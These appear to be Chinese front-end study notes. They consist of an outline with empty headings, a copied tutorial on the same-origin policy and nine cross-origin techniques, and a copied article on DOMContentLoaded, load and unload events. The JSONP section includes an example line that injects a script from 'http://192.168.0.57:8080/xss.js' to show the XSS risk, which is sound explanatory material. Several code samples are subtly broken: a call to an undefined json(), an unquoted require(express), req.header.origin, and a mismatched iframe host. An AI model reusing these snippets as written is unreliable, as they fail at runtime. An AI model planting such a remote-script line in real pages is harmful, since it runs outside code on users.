# 浏览器

## DOM操作

颜色

节流、防抖

## 事件

 事件循环

settimeout

处理事件

自定义事件

## 跨浏览器开发

浏览器兼容

 [如何机智地回答浏览器兼容性问题](https://juejin.im/post/5b3da006e51d4518f140edb2#heading-5)

 [fastclick 解决移动端click事件300ms延迟](https://www.jianshu.com/p/16d3e4f9b2a9)

  屏幕 css html javascript

移动端问题

web安全

## 渲染机制

## 前端跨域

## 同源策略

同源策略/SOP（Same origin policy）是一种约定，由 Netscape 公司 1995 年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到 XSS、CSRF 等攻击。所谓同源是指 "协议 + 域名 + 端口" 三者相同，即便两个不同的域名指向同一个 ip 地址，也非同源。

## 什么是跨域？

当协议、域名、端口号，有一个或多个不同时，有希望可以访问并获取数据的现象称为跨域访问，同源策略限制下 `cookie`、`localStorage`、`dom`、`ajax`、`IndexDB` 都是不支持跨域的。

假设 cookie 支持了跨域，http 协议无状态，当用户访问了一个银行网站登录后，银行网站的服务器给返回了一个 sessionId，当通过当前浏览器再访问一个恶意网站，如果 cookie 支持跨域，恶意网站将获取 sessionId 并访问银行网站，出现安全性问题；IndexDB、localStorage 等数据存储在不同域的页面切换时是获取不到的；假设 dom 元素可以跨域，在自己的页面写入一个 iframe 内部嵌入的地址是 www.baidu.com，当在百度页面登录账号密码时就可以在自己的页面获取百度的数据信息，这显然是不合理的。

这就是为什么 `cookie`、`localStorage`、`dom`、`ajax`、`IndexDB` 会受到同源策略会限制，下面还有一点对跨域理解的误区：

误区：同源策略限制下，访问不到后台服务器的数据，或访问到后台服务器的数据后没有返回；
正确：同源策略限制下，可以访问到后台服务器的数据，后台服务器会正常返回数据，而被浏览器给拦截了。

## 实现跨域的方式

### 一、使用 jsonp 跨域

使用场景：当自己的项目前端资源和后端部署在不同的服务器地址上，或者其他的公司需要访问自己对外公开的接口，需要实现跨域获取数据，如百度搜索。

```
// 封装 jsonp 跨域请求的方法
function jsonp({ url, params, cb }) {
    return new Promise((resolve, reject) => {
        // 创建一个 script 标签帮助我们发送请求
        let script = document.createElement("script");
        let arr = [];
        params = { ...params, cb };

        // 循环构建键值对形式的参数
        for (let key in params) {
            arr.push(`${key}=${params[key]}`);
        }

        // 创建全局函数
        window[cb] = function(data) {
            resolve(data);
            // 在跨域拿到数据以后将 script 标签销毁
            document.body.removeChild(script);
        };

        // 拼接发送请求的参数并赋值到 src 属性
        script.src = `${url}?${arr.join("&")}`;
        document.body.appendChild(script);
    });
}

// 调用方法跨域请求百度搜索的接口
json({
    url: "https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su",
    params: {
        wd: "jsonp"
    },
    cb: "show"
}).then(data => {
    // 打印请求回的数据
    console.log(data);
});
```

缺点：

- 只能发送 get 请求 不支持 post、put、delete；
- 不安全，容易引发 xss 攻击，别人在返回的结果中返回了下面代码。

```
`let script = document.createElement('script');
script.src = "http://192.168.0.57:8080/xss.js";
document.body.appendChild(script);`;
```

会把别人的脚本引入到自己的页面中执行，如：弹窗、广告等，甚至更危险的脚本程序。

### 二、使用 CORS 跨域

跨源资源共享/CORS（Cross-Origin Resource Sharing）是 W3C 的一个工作草案，定义了在必须访问跨源资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。

使用场景：多用于开发时，前端与后台在不同的 ip 地址下进行数据访问。

现在启动两个端口号不同的服务器，创建跨域条件，服务器（NodeJS）代码如下：

```
// 服务器1
const express = require(express);
let app = express();
app.use(express.static(__dirname));
app.listen(3000);

// 服务器2
const express = require("express");
let app = express();
app.get("/getDate", function(req, res) {
    res.end("I love you");
});
app.use(express.static(__dirname));
app.listen(4000);
```

由于我们的 NodeJS 服务器使用 `express` 框架，在我们的项目根目录下的命令行中输入下面代码进行安装：

> npm install express --save

通过访问 [http://localhost](http://localhost/):3000/index.html 获取 `index.html` 文件并执行其中的 `Ajax` 请求 [http://localhost](http://localhost/):4000/getDate 接口去获取数据，`index.html` 文件内容如下：

```
<!-- 文件：index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORS 跨域</title>
</head>
<body>
    <script>
        let xhr = new XMLHttpRequest();

        // 正常 cookie 是不允许跨域的
        document.cookie = 'name=hello';

        // cookie 想要实现跨域必须携带凭证
        xhr.withCredentials = true;

        // xhr.open('GET', 'http://localhost:4000/getDate', true);
        xhr.open('PUT', 'http://localhost:4000/getDate', true);

        // 设置名为 name 的自定义请求头
        xhr.setRequestHeader('name', 'hello');

        xhr.onreadystatechange = function () {
            if(xhr.readyState === 4) {
                if(xhr.status >= 200 && xhr.status < 300 || xhr.status === 304) {
                    // 打印返回的数据
                    console.log(xhr.response);

                    // 打印后台设置的自定义头信息
                    console.log(xhr.getResponseHeader('name'));
                }
            }
        }
        xhr.send();
    </script>
</body>
</html>
```

上面 `index.html` 代码中发送请求访问不在同源的服务器 `2`，此时会在控制台给出错误信息，告诉我们缺少了哪些响应头，我们对应报错信息去修改访问的服务器 `2` 的代码，添加对应的响应头，实现 CORS 跨域。

```
// 服务器2
const express = require("express");
let app = express();

// 允许访问域的白名单
let whiteList = ["http://localhost:3000"];

app.use(function(req, res, next) {
    let origin = req.header.origin;
    if (whiteList.includes(origin)) {
        // 设置那个源可以访问我，参数为 * 时，允许任何人访问，但是不可以和 cookie 凭证的响应头共同使用
        res.setHeader("Access-Control-Allow-Origin", origin);
        // 想要获取 ajax 的头信息，需设置响应头
        res.setHeader("Access-Control-Allow-Headers", "name");
        // 处理复杂请求的头
        res.setHeader("Access-Control-Allow-Methods", "PUT");
        // 允许发送 cookie 凭证的响应头
        res.setHeader("Access-Control-Allow-Credentials", true);
        // 允许前端获取哪个头信息
        res.setHeader("Access-Control-Expose-Headers", "name");
        // 处理 OPTIONS 预检的存活时间，单位 s
        res.setHeader("Access-Control-Max-Age", 5);
        // 发送 PUT 请求会做一个试探性的请求 OPTIONS，其实是请求了两次，当接收的请求为 OPTIONS 时不做任何处理
        if (req.method === "OPTIONS") {
            res.end();
        }
    }
    next();
});

app.put("/getDate", function(req, res) {
    // res.setHeader('name', 'nihao'); // 设置自定义响应头信息
    res.end("I love you");
});

app.get("/getDate", function(req, res) {
    res.end("I love you");
});

app.use(express.static(__dirname));
app.listen(4000);
```

### 三、使用 postMessage 实现跨域

postMessage 是 H5 的新 API，跨文档消息传送（cross-document messaging），有时候简称为 XMD，指的是在来自不同域的页面间传递消息。

调用方式：**window.postMessage(message, targetOrigin)**

- message：发送的数据
- targetOrigin：发送的窗口的域

在对应的页面中用 message 事件接收，事件对象中有 `data`、`origin`、`source` 三个重要信息

- data：接收到的数据
- origin：接收到数据源的域（数据来自哪个域）
- source：接收到数据源的窗口对象（数据来自哪个窗口对象）

使用场景：不是使用 `Ajax` 的数据通信，更多是在两个页面之间的通信，在 `A` 页面中引入 `B` 页面，在 `A`、`B` 两个页面之间通信。

与上面 CORS 类似，我们要创建跨域场景，搭建两个端口号不同的 Nodejs 服务器，后面相同方式就不多赘述了。

```
// 服务器1
const express = require(express);
let app = express();
app.use(express.static(__dirname));
app.listen(3000);

// 服务器2
const express = require(express);
let app = express();
app.use(express.static(__dirname));
app.listen(4000);
```

通过访问 [http://localhost](http://localhost/):3000/a.html，在 `a.html` 中使用 `iframe` 标签引入 [http://localhost](http://localhost/):4000/b.html，在两个窗口间传递数据。

```
<!-- 文件：a.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>页面 A</title>
</head>
<body>
    <iframe src="http://localhost:4000/b.html" id="frame" onload="load()"></iframe>
    <script>
        function load() {
            let frame = document.getElementById('frame');
            frame.contentWindow.postMessage('I love you', 'http://localhost:4000');
            window.onmessage = function (e) {
                console.log(e.data);
            }
        }
    </script>
</body>
</html>
<!-- 文件：b.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>页面 B</title>
</head>
<body>
    <script>
        window.onmessage = function (e) {
            // 打印来自页面 A 的消息
            console.log(e.data);
            // 给页面 A 发送回执
            e.source.postMessage('I love you, too', e.origin);
        }
    </script>
</body>
</html>
```

### 四、使用 window.name 实现跨域

同样是页面之间的通信，需要借助 `iframe` 标签，`A` 页面和 `B` 页面是同域的 [http://localhost](http://localhost/):3000，`C` 页面在独立的域 [http://localhost](http://localhost/):4000。

```
// 服务器1
const express = require(express);
let app = express();
app.use(express.static(__dirname));
app.listen(3000);

// 服务器2
const express = require(express);
let app = express();
app.use(express.static(__dirname));
app.listen(4000);
```

实现思路：在 `A` 页面中将 `iframe` 的 `src` 指向 `C` 页面，在 `C` 页面中将属性值存入 `window.name` 中，再把 `iframe` 的 `src` 换成同域的 `B` 页面，在当前的 `iframe` 的 `window` 对象中取出 `name` 的值，访问 [http://localhost](http://localhost/):3000/a.html。

```
<!-- 文件：a.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>页面 A</title>
</head>
<body>
    <iframe src="http://localhost:4000/c.html" id="frame" onload="load()"></iframe>
    <script>
        // 增加一个标识，第一次触发 load 时更改地址，更改后再次触发直接取值
        let isFirst = true;
        function load() {
            let frame = document.getElementById('frame');
            if(isFirst) {
                frame.src = 'http://localhost:3000/b.html';
                isFirst = false;
            } else {
                console.log(frame.contentWindow.name);
            }
        }
    </script>
</body>
</html>
<!-- 文件：c.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>页面 C</title>
</head>
<body>
    <script>
        window.name = 'I love you';
    </script>
</body>
</html>
```

<br/>

### 五、使用 location.hash 实现跨域

与 `window.name` 跨域的情况相同，是不同域的页面间的参数传递，需要借助 `iframe` 标签，`A` 页面和 `B` 页面是同域的 [http://localhost](http://localhost/):3000，`C` 页面是独立的域 [http://localhost](http://localhost/):4000。

```
// 服务器1
const express = require(express);
let app = express();
app.use(express.static(__dirname));
app.listen(3000);

// 服务器2
const express = require(express);
let app = express();
app.use(express.static(__dirname));
app.listen(4000);
```

实现思路：`A` 页面通过 `iframe` 引入 `C` 页面，并给 `C` 页面传一个 `hash` 值，`C` 页面收到 `hash` 值后创建 `iframe` 引入 `B` 页面，把 `hash` 值传给 `B` 页面，`B` 页面将自己的 `hash` 值放在 `A` 页面的 `hash` 值中，访问 [http://localhost](http://localhost/):3000/a.html。

```
<!-- 文件：a.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>页面 A</title>
</head>
<body>
    <iframe src="http://localhost:4000/c.html#Iloveyou" id="frame"></iframe>
    <script>
        // 使用 hashchange 事件接收来自 B 页面设置给 A 页面的 hash 值
        window.onhashchange = function () {
            console.log(location.hash);
        }
    </script>
</body>
</html>
<!-- 文件：c.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>页面 C</title>
</head>
<body>
    <script>
        // 打印 A 页面引入 C 页面设置的 hash 值
        console.log(location.hash);
        let iframe = document.createElement('iframe');
        iframe.src = 'http://localhost:3000/b.html#Iloveyoutoo';
        document.body.appendChild(iframe);
    </script>
</body>
</html>
<!-- 文件：b.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>页面 B</title>
</head>
<body>
    <script>
        // 将 C 页面引入 B 页面设置的 hash 值设置给 A页面
        window.parent.parent.location.hash = location.hash;
    </script>
</body>
</html>
```

<br/>

### 六、使用 document.domain 实现跨域

使用场景：不是万能的跨域方式，大多使用于同一公司不同产品间获取数据，必须是一级域名和二级域名的关系，如 www.baidu.com 与 video.baidu.com 之间。

```
const express = require("express");
let app = express();

app.use(express.static(__dirname));
app.listen(3000);
```

想要模拟使用 `document.domain` 跨域的场景需要做些小小的准备，到 C:WindowsSystem32driversetc 该路径下找到 `hosts` 文件，在最下面创建一个一级域名和一个二级域名。

> 127.0.0.1          www.domainacross.com
> 127.0.0.1          sub.domainacross.com

命名是随意的，只要是符合一级域名与 二级域名的关系即可，然后访问 [http://www.domainacross.com](http://www.domainacross.com/):3000/a.html。

```
<!-- 文件：a.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>页面 A</title>
</head>
<body>
    <p>我是页面 A 的内容</p>
    <iframe src="http://sucess.domainacross.com:3000/b.html" onload="load()" id="frame"></iframe>
    <script>
        document.domain = 'domainacross.com';
        function load() {
            console.log(frame.contentWindow.message);
        }
    </script>
</body>
</html>
<!-- 文件：b.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>页面 B</title>
</head>
<body>
    <p>我是 B 页面的内容</p>
    <script>
        document.domain = 'domainacross.com';
        var message = 'Hello A';
    </script>
</body>
</html>
```

### 七、使用 WebSocket 实现跨域

WebSocket 没有跨域限制，高级 API（不兼容），想要兼容低版本浏览器，可以使用 `socket.io` 的库，WebSocket 与 HTTP 内部都是基于 TCP 协议，区别在于 HTTP 是单向的（单双工），WebSocket 是双向的（全双工），协议是 `ws://` 和 `wss://` 对应 `http://` 和 `https://`，因为没有跨域限制，所以使用 `file://` 协议也可以进行通信。

由于我们在 NodeJS 服务中使用了 WebSocket，所以需要安装对应的依赖：

> npm install ws --save

```
<!-- 文件：index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>页面</title>
</head>
<body>
    <script>
        // 创建 webSocket
        let socket = new WebSocket('ws://localhost:3000');
        // 连接上触发
        socket.onopen = function () {
            socket.send('I love you');
        }
        // 收到消息触发
        socket.onmessage = function (e) {
            // 打印收到的数据
            console.log(e.data); // I love you, too
        }
    </script>
</body>
</html>
const express = require("express");
let app = express();

// 引入 webSocket
const WebSocket = require("ws");
// 创建连接，端口号与前端相对应
let wss = new WebSocket.Server({ port: 3000 });

// 监听连接
wss.on("connection", function(ws) {
    // 监听消息
    ws.on("message", function(data) {
        // 打印消息
        console.log(data); // I love you
        // 发送消息
        ws.send("I love you, too");
    });
});
```

### 八、使用 nginx 实现跨域

`nginx` 本身就是一个服务器，因此我们需要去 `nginx` 官网下载服务环境 [http://nginx.org/en/download....](http://nginx.org/en/download.html)。

- 下载后解压到一个文件夹中
- 双击 `nginx.exe` 启动（此时可以通过 [http://localhost](http://localhost/) 访问 `nginx` 服务）
- 在目录新建 `json` 文件夹
- 进入 `json` 文件夹新建 `data.json` 文件并写入内容
- 回到 `nginx` 根目录进入 `conf` 文件夹
- 使用编辑器打开 `nginx.conf` 进行配置

**data.json 文件：**

```
{
    "name": "nginx"
}
```

**nginx.conf 文件：**

```
server {
    .
    .
    .
    location ~.*\.json {
        root json;
        add_header "Access-Control-Allow-Origin" "*";
    }
    .
    .
    .
}
```

**含义：**

- ~.*\.json：代表忽略大小写，后缀名为 json 的文件；
- root json：代表 `json` 文件夹；
- add_header：代表加入跨域的响应头及允许访问的域，`*` 为允许任何访问。

在 `nginx` 根目录启动 `cmd` 命令行（windows 系统必须使用 `cmd` 命令行）执行下面代码重启 `nginx`。

> nginx -s reload

不跨域访问：<http://localhost/data.json>

跨域访问时需要创建跨域条件代码如下：

```
// 服务器
const express = require("express");
let app = express();

app.use(express.static(__dirname));
app.listen(3000);
```

跨域访问：[http://localhost](http://localhost/):3000/index.html

```
<!-- 文件：index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>nginx跨域</title>
</head>
<body>
    <script>
        let xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://localhost/data.json', true);
        xhr.onreadystatechange = function () {
            if(xhr.readyState === 4) {
                if(xhr.status >= 200 && xhr.status < 300 || xhr.status === 304) {
                    console.log(xhr.response);
                }
            }
        }
        xhr.send();
    </script>
</body>
</html>
```

<br/>

### 九、使用 http-proxy-middleware 实现跨域

NodeJS 中间件 `http-proxy-middleware` 实现跨域代理，原理大致与 `nginx` 相同，都是通过启一个代理服务器，实现数据的转发，也可以通过设置 `cookieDomainRewrite` 参数修改响应头中 `cookie` 中的域名，实现当前域的 `cookie` 写入，方便接口登录认证。

#### 1、非 vue 框架的跨域（2 次跨域）

```
<!-- 文件：index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>proxy 跨域</title>
</head>
<body>
    <script>
        var xhr = new XMLHttpRequest();

        // 前端开关：浏览器是否读写 cookie
        xhr.withCredentials = true;

        // 访问 http-proxy-middleware 代理服务器
        xhr.open('get', 'http://www.proxy1.com:3000/login?user=admin', true);
        xhr.send();
    </script>
</body>
</html>
```

中间代理服务中使用了 `http-proxy-middleware` 中间件，因此需要提前下载：

> npm install http-proxy-middleware --save-dev

```
// 中间代理服务器
const express = require("express");
let proxy = require("http-proxy-middleware");
let app = express();

app.use(
    "/",
    proxy({
        // 代理跨域目标接口
        target: "http://www.proxy2.com:8080",
        changeOrigin: true,

        // 修改响应头信息，实现跨域并允许带 cookie
        onProxyRes: function(proxyRes, req, res) {
            res.header("Access-Control-Allow-Origin", "http://www.proxy1.com");
            res.header("Access-Control-Allow-Credentials", "true");
        },

        // 修改响应信息中的 cookie 域名
        cookieDomainRewrite: "www.proxy1.com" // 可以为 false，表示不修改
    })
);

app.listen(3000);
// 服务器
const http = require("http");
const qs = require("querystring");

const server = http.createServer();

server.on("request", function(req, res) {
    let params = qs.parse(req.url.substring(2));

    // 向前台写 cookie
    res.writeHead(200, {
        "Set-Cookie": "l=a123456;Path=/;Domain=www.proxy2.com;HttpOnly" // HttpOnly：脚本无法读取
    });

    res.write(JSON.stringify(params));
    res.end();
});

server.listen("8080");
```

#### 2、vue 框架的跨域（1 次跨域）

利用 **node + webpack + webpack-dev-server** 代理接口跨域。在开发环境下，由于 `Vue` 渲染服务和接口代理服务都是 `webpack-dev-server`，所以页面与代理接口之间不再跨域，无须设置 `Headers` 跨域信息了。

```
// 导出服务器配置
module.exports = {
    entry: {},
    module: {},
    ...
    devServer: {
        historyApiFallback: true,
        proxy: [{
            context: '/login',
            target: 'http://www.proxy2.com:8080',  // 代理跨域目标接口
            changeOrigin: true,
            secure: false,  // 当代理某些 https 服务报错时用
            cookieDomainRewrite: 'www.domain1.com'  // 可以为 false，表示不修改
        }],
        noInfo: true
    }
}
```

本篇文章在于帮助我们理解跨域，以及不同跨域方式的基本原理，在公司的项目比较多，多个域使用同一个服务器或者数据，以及在开发环境时，跨域的情况基本无法避免，一般会有各种各样形式的跨域解决方案，但其根本原理基本都在上面的跨域方式当中方式，我们可以根据开发场景不同，选择最合适的跨域解决方案。

## 浏览器存储

## 页面生命周期：DOMContentLoaded、load、beforeunload 和 unload



HTML 页面的生命周期有三个重要事件：

- `DOMContentLoaded` —— 浏览器加载 HTML，并构建 DOM 树，但像 `<img>` 和样式这样的资源可能还没有加载。
- `load` —— 浏览器加载所有资源（图像，样式等）。
- `beforeunload/unload` —— 当用户离开页面时。

每个事件都是有用的：

- `DOMContentLoaded` 事件 —— DOM 已经准备好，因此处理器可以查找 DOM 节点，并初始化接口。
- `load` 事件 —— 额外资源被加载后，我们可以获取图像大小（如果在 HTML/CSS 中没有指定）等。
- `beforeunload/unload` 事件 —— 用户即将离开：我们可以检查用户是否保存了修改，并在询问他是否真的要离开。

我们探讨一下这些事件的细节。

## [DOMContentLoaded](https://zh.javascript.info/onload-ondomcontentloaded#domcontentloaded)

`DOMContentLoaded` 事件发生在 `document` 对象上。

我们必须使用 `addEventListener` 来监听它：

```javascript
document.addEventListener("DOMContentLoaded", ready);
```

例如：





```markup
<script>
  function ready() {
    alert('DOM is ready');

    // 图像尚未加载（除非已经有了缓存）因此大小是 0x0
    alert(`Image size: ${img.offsetWidth}x${img.offsetHeight}`);
  }

  document.addEventListener("DOMContentLoaded", ready);
</script>

<img id="img" src="https://en.js.cx/clipart/train.gif?speed=1&cache=0">
```

<iframe name="frame-0.575953615702014" class="code-result__iframe" style="display: block; border: 0px; width: 531.354px; height: 200px;"></iframe>

在示例中，`DOMContentLoaded` 处理器在文档加载时运行，而不是等到页面被加载时运行。因此 `alert` 显示大小为零。

初识 `DOMContentLoaded` 事件时，觉得它比较简单。DOM 树已经准备好了 —— 这是事件。但却没有什么特别之处。

### [DOMContentLoaded 和脚本](https://zh.javascript.info/onload-ondomcontentloaded#domcontentloaded-he-jiao-ben)

当浏览器开始加载 HTML 并在文本中遇到 `<script>...</script>` 时，就会停止构建 DOM。它必须立即执行脚本。因此 `DOMContentLoaded` 只有在所有此类脚本被执行后才会发生。

额外的脚本（带有 `src`）也会促使 DOM 构建在加载和执行过程时暂停。因此 `DOMContentLoaded` 也会等待外部脚本。

唯一的例外是具有 `async` 和 `defer` 属性的外部脚本。它们告诉浏览器可以继续解析文档而不必等待脚本解析和执行。因此用户可以在脚本完成加载之前就看到页面，这对性能来说是有好处的。

**A word about `async` and `defer`**

属性 `async`和 `defer` 仅适用于外部脚本。如果没有 `src`，它们就会被忽略。

这两种方法告诉浏览器，它可以继续解析页面，并“在后台”继续加载脚本，然后在外部脚本加载完成后执行它。因此脚本不会阻塞 DOM 的构建和页面的渲染。

他们之间有两个不同之处。

|                    | `async`                                                      | `defer`                                                      |
| ------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| Order              | 具有 `async` 的脚本以**第一顺序被加载**。它们的文档顺序并不重要 —— 先加载先运行。 | 具有 `defer` 的脚本总是按照**文档顺序**来执行（就像它们在文档中那样）。 |
| `DOMContentLoaded` | 具有 `async` 的脚本可以在文档尚未完全下载时加载和执行。如果脚本较小或被缓存，而且文档足够长，就会发生这种情况。 | 在 `DOMContentLoaded`之前，具有 `defer` 的脚本会在文档被加载并解析后执行（如果需要，它们会等待）。 |

因此 `async` 用于完全独立的脚本。

### [DOMContentLoaded 和样式](https://zh.javascript.info/onload-ondomcontentloaded#domcontentloaded-he-yang-shi)

外部样式不会影响 DOM，因此 `DOMContentLoaded` 无需等待它们。

但有一个陷阱：如果在样式之后有一个脚本，那么该脚本必须等待样式被执行：

```markup
<link type="text/css" rel="stylesheet" href="style.css">
<script>
  // the script doesn't not execute until the stylesheet is loaded
  alert(getComputedStyle(document.body).marginTop);
</script>
```

原因是脚本可能希望获取如上述示例所描述的元素坐标和其他与样式相关的属性。当然，它必须等待样式被加载。

当 `DOMContentLoaded` 等待脚本时，它也在等待它们之前的样式。

### [浏览器内置填写](https://zh.javascript.info/onload-ondomcontentloaded#liu-lan-qi-nei-zhi-tian-xie)

Firefox、Chrome 和 Opera 都会在 `DOMContentLoaded` 中自动填写表单。

比如，如果页面有一个带有登录和密码的表单，并且浏览器记住了这些值，那么在 `DOMContentLoaded` 上，它就可以尝试自动填写它们（如果用户允许）。

因此如果 `DOMContentLoaded` 被长加载脚本延迟，那么自动填写也在等待。你可能在某些站点上（如果你使用浏览器自动填写）—— 登录/密码字段将不会立即自动填写，在页面被完全加载前会出现延迟。这实际上是延迟到 `DOMContentLoaded` 事件。

为外部脚本使用 `async` 和 `defer` 的一个好处是 —— 它们不会阻塞 `DOMContentLoaded`，而且也不会延迟浏览器的自动填写。

## [window.onload](https://zh.javascript.info/onload-ondomcontentloaded#window-onload)

当包括样式、图像和其他资源的页面被全部加载时，`load` 事件就会在 `window` 对象上被触发。

以下示例正确地显示了图像大小，因为 `window.onload` 等待了所有的图像：





```markup
<script>
  window.onload = function() {
    alert('Page loaded');

    // image is loaded at this time
    alert(`Image size: ${img.offsetWidth}x${img.offsetHeight}`);
  };
</script>

<img id="img" src="https://en.js.cx/clipart/train.gif?speed=1&cache=0">
```

## [window.onunload](https://zh.javascript.info/onload-ondomcontentloaded#windowonunload)

当访问者离开页面时，`unload` 事件会在 `window` 上被触发。我们可以在那里做一些不涉及延迟的事件，比如关闭相关的弹出窗口。但我们不能取消跳转到另一个页面的事件。

因此我们需要使用另一个事件 —— `onbeforeunload`。

## [window.onbeforeunload](https://zh.javascript.info/onload-ondomcontentloaded#window.onbeforeunload)

如果访问中启动了离开页面的导航或试图关闭窗口，`beforeunload` 处理器将要求提供更多的确认。

它可能会返回一个带有问题的字符串。从历史上看，浏览器通常会显示它，但到目前为止，只有一些浏览器这样做。这是因为某些站长滥用了这个事件处理器，显示了误导和恶意的信息。

你可以通过运行这段代码，然后重新加载页面来进行尝试。





```javascript
window.onbeforeunload = function() {
  return "There are unsaved changes. Leave now?";
};
```

你也可以单击以下 `<iframe>` 中的按钮来设置处理器，然后单击链接：





<iframe class="code-result__iframe" data-trusted="1" src="https://zh.js.cx/article/onload-ondomcontentloaded/window-onbeforeunload/" style="display: block; border: 0px; width: 531.354px; height: 80px;"></iframe>

## [readyState](https://zh.javascript.info/onload-ondomcontentloaded#readystate)

如果在加载文档之后设置 `DOMContentLoaded` 处理器会发生什么？

很自然地，它从未运行过。

在某些情况下，我们不确定文档是否已经准备就绪，比如一个具有 `async` 属性的脚本加载并异步运行。取决于网络，它可能在文档完成之前加载和执行，或者在此之后，我们无法确定。因此，我们应该能够知道文件的当前状态。

`document.readyState` 属性为我们提供了一些关于它的信息。有三个可能的值：

- `"loading"` —— 文档正在被加载。
- `"interactive"` —— 文档被全部读取。
- `"complete"` —— 文档被全部读取，所有的资源（图像之类的）都被加载。

因此我们检查 `document.readyState` 并设置一个处理器，或在代码准备就绪时立即执行它。

就像这样：

```javascript
function work() { /*...*/ }

if (document.readyState == 'loading') {
  document.addEventListener('DOMContentLoaded', work);
} else {
  work();
}
```

有一个 `readystatechange` 事件，当状态发生变化时触发，因此我们可以打印如下所有这些状态：





```javascript
// current state
console.log(document.readyState);

// print state changes
document.addEventListener('readystatechange', () => console.log(document.readyState));
```

`readystatechange` 事件是跟踪文档加载状态的另一种机制，它很早就存在了。现在则很少被使用，但我们还是需要来讨论一下它的完整性。

`readystatechange` 在其他事件中的地位？

要查看时间，这里有一个带有 `<iframe>`、`<img>` 和记录事件的处理器：

```markup
<script>
  function log(text) { /* output the time and message */ }
  log('initial readyState:' + document.readyState);

  document.addEventListener('readystatechange', () => log('readyState:' + document.readyState));
  document.addEventListener('DOMContentLoaded', () => log('DOMContentLoaded'));

  window.onload = () => log('window onload');
</script>

<iframe src="iframe.html" onload="log('iframe onload')"></iframe>

<img src="http://en.js.cx/clipart/train.gif" id="img">
<script>
  img.onload = () => log('img onload');
</script>
```

[在 sandbox](https://plnkr.co/edit/zia9iE8JAhcIpBOXqxAb?p=preview) 中的运行示例。

典型输出：

1. [1] initial readyState:loading
2. [2] readyState:interactive
3. [2] DOMContentLoaded
4. [3] iframe onload
5. [4] readyState:complete
6. [4] img onload
7. [4] window onload

方括号中的数字表示发生这种情况的大致时间。实际时间会长一些，但标记为相同数字的事件几乎是同时发生的（± 几毫秒）。

- `document.readyState` 在 `DOMContentLoaded` 之前会立即变成了 `interactive`。这两个事件的意义没有任何差别。
- 当所有资源（`iframe` 和 `img`）都被加载后，`document.readyState` 变成了 `complete`。这里我们可以发现，它大约发生在 `img.onload` (`img` 是最后的资源) 和 `window.onload` 之间。转换到 `complete` 状态的意义与 `window.onload`一致。区别在于 `window.onload` 在所有其他 `load` 处理器之后一直有效。

## [总结](https://zh.javascript.info/onload-ondomcontentloaded#zong-jie)

页面生命周期事件：

- 当 DOM 准备就绪时，

  ```
  DOMContentLoaded
  ```

   

  事件就会在

   

  ```
  document
  ```

   

  上触发。在这个阶段，我们可以将 JavaScript 应用于元素。

  - 除了 `async` 或 `defer` 的脚本外，所有的脚本都会被执行。
  - 图像和其他资源仍然可以继续被加载。

- 当页面和所有资源被加载时，`load` 事件会在 `window` 上被触发。我们很少使用它，因为通常没有必要去等待那么久。

- 当用户想要离开页面时，`beforeunload` 事件会在 `window` 上被触发。如果他返回一个字符串，那么浏览器就会以问题的形式向用户确认是否真的要离开。

- 当用户最终离开时，`unload` 事件会在 `window` 上被触发，在处理器中，我们只能做一些简单的事情，不会涉及到延迟或询问用户。正是由于这个限制，它很少被使用。

- ```
  document.readyState
  ```

   

  是文档的当前状态，可以在

   

  ```
  readystatechange
  ```

   

  事件中跟踪变更：

  - `loading` —— 文档正在被加载。
  - `interactive` —— 文档被解析，大概是与 `DOMContentLoaded` 同时发生，而不是在它之前发生。
  - `complete` —— 文档和资源被加载，与 `window.onload` 同时发生，而不是在它之前发生。

<>

## 浏览器存储

[各种存储对比](https://developers.google.com/web/fundamentals/instant-and-offline/web-storage/offline-for-pwa?hl=zh-cn)

<https://github.com/youngwind/blog/issues/113>